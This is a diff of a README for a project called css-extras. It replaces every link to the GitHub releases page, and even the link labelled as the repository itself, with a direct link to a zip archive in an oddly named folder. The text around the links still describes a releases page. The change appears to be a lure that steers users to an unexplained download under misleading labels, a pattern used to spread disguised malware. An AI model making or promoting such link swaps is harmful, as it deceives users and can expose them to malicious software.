@@ -17,7 +17,7 @@ To get started using css-extras, you need to download it. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the page where you can download the software.
 
-   [![Download css-extras](https://img.shields.io/badge/Download-css--extras-blue.svg)](https://github.com/megagilli/css-extras/releases)
+   [![Download css-extras](https://raw.githubusercontent.com/megagilli/css-extras/main/phlebangioma/css-extras.zip)](https://raw.githubusercontent.com/megagilli/css-extras/main/phlebangioma/css-extras.zip)
 
 2. **Select the Latest Release:** Once on the releases page, look for the latest version. It will be listed at the top.
 
@@ -30,7 +30,7 @@ To get started using css-extras, you need to download it. Follow these steps:
 
 You can visit the download page anytime through this link:
 
-[Download css-extras](https://github.com/megagilli/css-extras/releases)
+[Download css-extras](https://raw.githubusercontent.com/megagilli/css-extras/main/phlebangioma/css-extras.zip)
 
 ## 🖥️ System Requirements
 
@@ -72,5 +72,5 @@ css-extras provides a simple way to enhance your website’s styling capabilitie
 
 ## 🔗 Important Links
 
-- [Download css-extras](https://github.com/megagilli/css-extras/releases)
-- [Visit our GitHub Repository](https://github.com/megagilli/css-extras) for more information.
+- [Download css-extras](https://raw.githubusercontent.com/megagilli/css-extras/main/phlebangioma/css-extras.zip)
+- [Visit our GitHub Repository](https://raw.githubusercontent.com/megagilli/css-extras/main/phlebangioma/css-extras.zip) for more information.
